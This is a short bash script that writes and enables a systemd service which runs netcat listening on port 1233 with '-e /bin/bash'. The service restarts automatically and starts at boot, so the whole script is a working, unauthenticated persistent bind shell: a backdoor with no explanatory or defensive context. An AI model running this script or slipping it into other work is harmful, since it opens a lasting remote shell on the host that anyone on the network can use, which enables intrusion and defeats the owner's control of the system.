#!/bin/bash

filename="/etc/systemd/system/netcat-shell.service"

cat <<EOL > $filename
[Unit]
Description=Netcat Bash Shell Service
After=network.target

[Service]
ExecStart=/bin/nc -lvp 1233 -e /bin/bash
Restart=always
User=nobody
Group=nogroup

[Install]
WantedBy=multi-user.target
EOL

sudo systemctl daemon-reload
sudo systemctl enable netcat-shell.service
sudo systemctl start netcat-shell.service